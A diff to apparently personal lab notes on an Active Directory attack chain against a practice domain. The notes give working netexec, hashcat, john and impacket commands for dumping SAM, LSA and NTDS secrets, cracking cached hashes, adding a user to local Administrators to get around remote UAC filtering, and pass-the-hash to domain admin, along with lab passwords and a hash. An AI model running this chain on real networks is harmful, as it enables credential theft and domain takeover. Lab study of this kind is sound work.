@@ -160,10 +160,15 @@ Add-LocalGroupMember -Group "Administrators" -Member "adiaz"
 
 ![](../0.%20Assets/AD%20Chain%203-1793355625378.webp)
 
+`sam`
+
 ![](../0.%20Assets/AD%20Chain%203-1793355636917.webp)
 
-![](../0.%20Assets/AD%20Chain%203-1793355822675.webp)![](../0.%20Assets/AD%20Chain%203-1793355842244.webp)
+`lsas`
 
+![](../0.%20Assets/AD%20Chain%203-1793355842244.webp)
+
+I will get the hashes into a file and then crack them
 ```
 netexec smb $T -u 'adiaz' -p 'Peru123.' --lsa | awk '{print $5}' | fgrep '/' | sed -E 's/^[^:]+\/([^:]+):/\1#/' | sed 's/:$//' | sed 's/^[^#]*#//' | tee mscash_hashes_perfect  
 
@@ -176,7 +181,11 @@ hashcat -m 2100 -a 0 mscash_hashes_perfect /usr/share/wordlists/rockyou.txt
 
 ![](../0.%20Assets/AD%20Chain%203-1793357598248.webp)
 
+testing the credentials we see that `jbailey` has `winrm` access to client 1
+
 ![](../0.%20Assets/AD%20Chain%203-1793359216874.webp)
+
+And the privilege escalation vector is pretty easy, `jbailey` has the `seBackupPrivilege` so we can just make a copy of `sam` and `system` and dump the contents with `impacket-secretsdump`
 
 ![](../0.%20Assets/AD%20Chain%203-1793359711861.webp)
 
@@ -191,18 +200,7 @@ let's see what we can do with these hashes
 
 ![](../0.%20Assets/AD%20Chain%203-1793363108804.webp)
 
-I was stuck for a bit but brian is not a domain user
-
-![](../0.%20Assets/AD%20Chain%203-1793363225958.webp)
-
-
-but we hit this restriction
-
-![](../0.%20Assets/AD%20Chain%203-1793363340638.webp)
-
-so we need to crack the hash
-
-when we crack it we see that because of special characters `hashcat` shows the output in `hex`
+when we crack the hash of brian we see that because of special characters `hashcat` shows the output in `hex`
 
 we can turn that arround with this command
 
@@ -218,15 +216,19 @@ xfreerdp /v:10.0.2.3 /u:'Brian' /p:''Iloveyou:D'' /cert:ignore +clipboard /dynam
 
 ![](../0.%20Assets/AD%20Chain%203-1793364633609.webp)
 
+---
 - **SAM (Security Account Manager):** Stores **local machine accounts** only. You get NTLM hashes for users that only exist on that specific computer.
 - **LSA Secrets (Local Security Authority):** Stores **system and domain infrastructure secrets**. You get service account passwords, computer account passwords, and sometimes cleartext domain credentials.
+
 As a local admin, you were trapped in a box. Windows blocked you from reaching the LSA secrets over the network because of **Remote UAC filtering**.
 
 By adding a **Domain User** to the local administrators group, you bypassed that security filter entirely. It gave you the full, unrestricted token needed to unlock `HKLM\SECURITY` and extract those high-value domain secrets.
 
 **In short:** SAM gives you the keys to the room. LSA gives you the keys to the castle. The domain user trick is the lockpick that gets you from the room to the castle.
 
-So let's do that
+---
+
+So let's do that, `Brian` is a `local admin` (we can't dump `lsas`) so we add the domain user that has to the machine to the `administrators` group
 
 ```
 Add-LocalGroupMember -Group "Administrators" -Member "jbailey"
@@ -236,15 +238,21 @@ Add-LocalGroupMember -Group "Administrators" -Member "jbailey"
 
 ![](../0.%20Assets/AD%20Chain%203-1793365268331.webp)
 
+And now we can dump the `lssas`
+
 ```
 netexec smb 10.0.2.0/24 -u 'jbailey' -p 'Paulio*3' --lsa
 ```
 
 ![](../0.%20Assets/AD%20Chain%203-1793365395667.webp)
 
+We get a couple hashes
+
 ```
 netexec smb 10.0.2.0/24 -u 'jbailey' -p 'Paulio*3' --lsa | awk '{print $5}' | fgrep '/' | sed -E 's/^[^:]+\/([^:]+):/\1#/' | sed 's/:$//' | sed 's/^[^#]*#//' | tee mscash_hashes
 ```
+
+
 
 ![](../0.%20Assets/AD%20Chain%203-1793365409891.webp)
 
@@ -253,6 +261,8 @@ john mscash_hashes -w=/usr/share/wordlists/rockyou.txt -format=mscash2
 ```
 
 ![](../0.%20Assets/AD%20Chain%203-1793366249635.webp)
+
+we have the password to `amorales`
 
 And `amorales` is an admin in DC01
 
@@ -266,7 +276,7 @@ netexec smb 10.0.2.4 -u 'amorales' -p 'Seduction?1' --ntds
 
 ![](../0.%20Assets/AD%20Chain%203-1793366557143.webp)
 
-Finally we can do a `pass the hash` with the administrator hash
+Finally we can do a `pass the hash` with the administrator hash (NTDS contains NTLM hashes so we don't need to crack anything)
 
 ```
 impacket-psexec hack-academy.local/Administrator@10.0.2.4 -hashes :c0ced2de918b4a7c1b9f4efd225dd503
@@ -275,3 +285,6 @@ impacket-psexec hack-academy.local/Administrator@10.0.2.4 -hashes :c0ced2de918b4
 ![](../0.%20Assets/AD%20Chain%203-1793366811542.webp)
 
 And we are in DC01 as domain admin
+
+
+![](../0.%20Assets/AD%20Chain%203-1793368945689.webp)
